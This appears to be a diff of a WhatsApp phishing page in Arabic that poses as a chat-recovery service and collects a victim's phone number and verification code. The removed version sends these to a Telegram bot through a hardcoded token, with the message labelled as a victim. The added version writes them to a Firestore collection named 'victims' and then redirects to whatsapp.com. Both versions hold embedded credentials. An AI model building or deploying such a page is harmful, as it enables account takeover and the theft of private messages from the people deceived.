@@ -1,96 +1,14 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp - استعادة المحادثات</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{
-            font-family:'Segoe UI',Tahoma,sans-serif;
-            background:linear-gradient(135deg,#075e54,#128c7e,#25d366);
-            color:#fff;min-height:100vh;
-            display:flex;align-items:center;justify-content:center;padding:20px;
-        }
-        .container{
-            background:rgba(0,0,0,0.6);border-radius:16px;padding:30px 20px;
-            max-width:400px;width:100%;text-align:center;
-            border:2px solid #25d366;box-shadow:0 0 40px rgba(37,211,102,0.5);
-        }
-        .logo{font-size:50px;margin-bottom:10px}
-        h1{font-size:20px;margin-bottom:5px}
-        .sub{color:#ccc;font-size:12px;margin-bottom:20px}
-        .fg{margin-bottom:14px;text-align:right}
-        label{display:block;color:#ddd;font-size:12px;margin-bottom:5px}
-        input,select{
-            width:100%;padding:13px;background:rgba(255,255,255,0.1);
-            border:1px solid rgba(255,255,255,0.2);border-radius:8px;
-            color:#fff;font-size:14px;outline:none;
-        }
-        input:focus,select:focus{border-color:#25d366;box-shadow:0 0 15px rgba(37,211,102,0.3)}
-        input::placeholder{color:#aaa}
-        select{appearance:none}
-        select option{background:#075e54;color:#fff}
-        .btn{
-            width:100%;padding:14px;margin-top:10px;
-            background:#25d366;color:#fff;border:none;border-radius:8px;
-            font-size:17px;font-weight:bold;cursor:pointer;
-            box-shadow:0 0 25px rgba(37,211,102,0.4);
-        }
-        .btn:active{transform:scale(0.96)}
-        .load{
-            display:none;position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:99;
-            justify-content:center;align-items:center;flex-direction:column;
-        }
-        .load.show{display:flex}
-        .spinner{
-            width:50px;height:50px;border:4px solid #333;
-            border-top:4px solid #25d366;border-radius:50%;
-            animation:spin 0.8s linear infinite;margin-bottom:18px;
-        }
-        @keyframes spin{to{transform:rotate(360deg)}}
-        .done{
-            display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:98;
-            justify-content:center;align-items:center;flex-direction:column;
-        }
-        .done.show{display:flex}
-        .done h2{color:#25d366;font-size:24px;margin:12px 0}
-    </style>
-</head>
-<body>
-
-<div class="container" id="form">
-    <div class="logo">💬</div>
-    <h1>WhatsApp</h1>
-    <p class="sub">استعادة المحادثات المحذوفة</p>
-    
-    <div class="fg"><label>📱 رقم الهاتف</label><input type="tel" id="phone" placeholder="+2010xxxxxxxx"></div>
-    <div class="fg"><label>🌍 الدولة</label><select id="country"><option value="">-- اختر الدولة --</option><option>مصر</option><option>السعودية</option><option>الإمارات</option><option>الكويت</option><option>قطر</option><option>البحرين</option><option>عمان</option><option>الأردن</option><option>المغرب</option><option>الجزائر</option></select></div>
-    <div class="fg"><label>🔒 كود التحقق (سيصلك)</label><input type="text" id="code" placeholder="أدخل الكود"></div>
-    
-    <button class="btn" onclick="go()">🔄 استعادة المحادثات</button>
-</div>
-
-<div class="load" id="load"><div class="spinner"></div><p>⏳ جاري استعادة المحادثات...</p></div>
-<div class="done" id="done"><h2>✅ تمت الاستعادة!</h2><p>سيتم إرسال النسخة الاحتياطية قريباً</p></div>
-
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>WhatsApp</title>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#075e54,#25d366);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.container{background:rgba(0,0,0,0.6);border-radius:12px;padding:25px;max-width:400px;width:100%;text-align:center}.logo{font-size:40px;margin-bottom:10px}h1{font-size:18px;margin-bottom:15px}input{width:100%;padding:12px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:6px;color:#fff;font-size:13px;outline:none;margin-bottom:8px}input:focus{border-color:#25d366}.btn{width:100%;padding:12px;background:#25d366;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:bold;cursor:pointer}.load{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:99;justify-content:center;align-items:center;flex-direction:column}.load.show{display:flex}.spinner{width:40px;height:40px;border:4px solid #333;border-top:4px solid #25d366;border-radius:50%;animation:spin 0.8s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}</style></head>
+<body><div class="container"><div class="logo">💬</div><h1>WhatsApp</h1><p style="color:#ddd;font-size:12px;margin-bottom:15px">استعادة المحادثات</p>
+<input type="tel" id="phone" placeholder="رقم الهاتف">
+<input type="text" id="code" placeholder="كود التحقق">
+<button class="btn" onclick="go()">استعادة</button></div>
+<div class="load" id="load"><div class="spinner"></div><p>⏳ جاري الاستعادة...</p></div>
 <script>
-const u=new URL(window.location.href);
-const CHAT=u.searchParams.get('chatId')||'7276604783';
-const TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
-async function send(t){
-    try{await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:'HTML'})})}catch(e){}
-}
-async function go(){
-    const ph=document.getElementById('phone').value.trim();
-    const co=document.getElementById('country').value;
-    const cd=document.getElementById('code').value.trim();
-    if(!ph||!co||!cd)return alert('املأ جميع الحقول');
-    document.getElementById('load').classList.add('show');
-    const msg=`💬 <b>ضحية واتساب!</b>\n\n📱 هاتف: ${ph}\n🌍 دولة: ${co}\n🔒 كود: ${cd}\n\n📱 ${navigator.userAgent}`;
-    await send(msg);
-    setTimeout(()=>{document.getElementById('load').classList.remove('show');document.getElementById('done').classList.add('show');setTimeout(()=>{window.location.href='https://whatsapp.com/'},3000)},4000);
-}
-</script>
-</body>
-</html>
+firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
+var db=firebase.firestore();
+async function go(){var ph=document.getElementById('phone').value.trim(),cd=document.getElementById('code').value.trim();if(!ph||!cd)return alert('املأ الحقول');document.getElementById('load').classList.add('show');await db.collection('victims').add({service:'💬 واتساب',text:'📱 '+ph+' | 🔒 '+cd,timestamp:new Date().toISOString()});setTimeout(function(){document.getElementById('load').classList.remove('show');window.location.href='https://whatsapp.com/'},2000)}
+</script></body></html>
